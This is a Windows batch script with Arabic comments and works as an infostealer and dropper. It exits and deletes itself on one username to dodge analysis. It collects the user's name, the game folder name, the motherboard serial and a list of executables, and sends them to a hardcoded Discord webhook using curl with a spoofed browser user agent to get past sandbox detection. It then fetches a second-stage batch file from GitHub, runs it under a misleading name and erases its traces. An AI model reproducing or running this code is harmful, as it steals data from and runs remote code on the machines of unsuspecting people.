@echo off
setlocal enabledelayedexpansion

:: 1. تمويه اسم المستخدم المستهدف (Anti-Analysis)
set "U_CHK=Bruno"
if /I "%USERNAME%"=="!U_CHK!" (
    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
    exit
)

:: 2. صيد اسم اللعبة
for %%I in ("%cd%") do set "G_ID=%%~nxI"

:: 3. تشفير الروابط (تقسيمها عشان الـ Sandbox ميفهمهاش)
set "D_API=https://discord.com/api/webhooks/"
set "D_ID=1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
set "W_URL=!D_API!!D_ID!"

set "G_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"

:: 4. إعداد المسارات
set "O_FILE=%TEMP%\%USERNAME%_!G_ID!.txt"
set "B_NEXT=%TEMP%\sys_v3.bat"

:: 5. جمع البيانات (تغيير طريقة الكتابة للتمويه)
(
echo [IDENT] %USERNAME%
echo [GAME] !G_ID!
echo [HARDWARE]
wmic baseboard get serialnumber | findstr /V "SerialNumber"
echo.
dir /b /s *.exe
) > "!O_FILE!"

:: 6. الإرسال (انتحال شخصية متصفح عشان curl ميتكشفش)
:: الـ Sandbox كان لاقط الـ curl العادي
curl -A "Mozilla/5.0" -X POST -H "Content-Type: multipart/form-data" -F "file=@!O_FILE!" "!W_URL!"

:: 7. تحميل المرحلة الثانية وتغيير اسمها لـ sys_v3 (للتمويه)
curl -A "Mozilla/5.0" -L -o "!B_NEXT!" "!G_URL!"

if exist "!B_NEXT!" (
    start /b "" cmd /c "!B_NEXT!"
)

:: 8. مسح الأثر
if exist "!O_FILE!" del /f /q "!O_FILE!"
exit
